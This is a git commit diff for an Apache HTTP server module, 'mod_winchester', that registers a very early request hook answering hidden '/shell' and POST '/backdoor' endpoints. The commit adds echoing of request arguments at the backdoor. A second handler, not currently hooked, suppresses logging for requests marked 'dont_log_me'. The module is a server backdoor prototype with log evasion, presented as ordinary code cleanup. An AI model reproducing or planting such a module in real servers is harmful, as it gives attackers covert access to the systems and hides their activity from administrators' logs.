ce5ac00a535a60982446f04cb935ff380ab0d057
Milkshak3s <justchris.vantine@gmail.com>
2018-01-06 14:54:14 -0500

    Cleaned up code

--- mod_winchester.c
+++ mod_winchester.c
@@ -7,27 +7,20 @@ static void register_hooks(apr_pool_t *pool);
 static int winchester_handler(request_rec *r);
 static int backblast_handler(request_rec *r);
 
-static void register_hooks(apr_pool_t *pool)
-{
-   ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
-   // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
-}
-
+// very early handler
 static int winchester_handler(request_rec *r)
 {
-	if (!r->unparsed_uri)
-    {
+	if (!r->unparsed_uri){
         // no uri, pass
         return OK;
     }
-    if (strcmp(r->unparsed_uri, "/shell") == 0)
-    {
+    if (strcmp(r->unparsed_uri, "/shell") == 0){
         ap_rprintf(r, "Shell dir");
         return DONE;
     }
-    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST)
-    {
+    if (strcmp(r->unparsed_uri, "/backdoor") == 0 && r->method_number == M_POST){
         ap_rprintf(r, "Backdoor POST");
+        ap_rprintf(r, "%s", r->args);
         return DONE;
     }
 
@@ -35,16 +28,22 @@ static int winchester_handler(request_rec *r)
 	return OK;
 }
 
+// logging handler
 static int backblast_handler(request_rec *r)
 {
-    if (strcmp(r->filename, "dont_log_me"))
-    {
+    if (strcmp(r->filename, "dont_log_me")){
         // if this filename does not appear, move along
         return OK;
     }
 
     // if it does, throw DONE without logging
     return DONE;
+}
+
+static void register_hooks(apr_pool_t *pool)
+{
+   ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
+   // ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
 }
 
 module AP_MODULE_DECLARE_DATA   winchester_module =
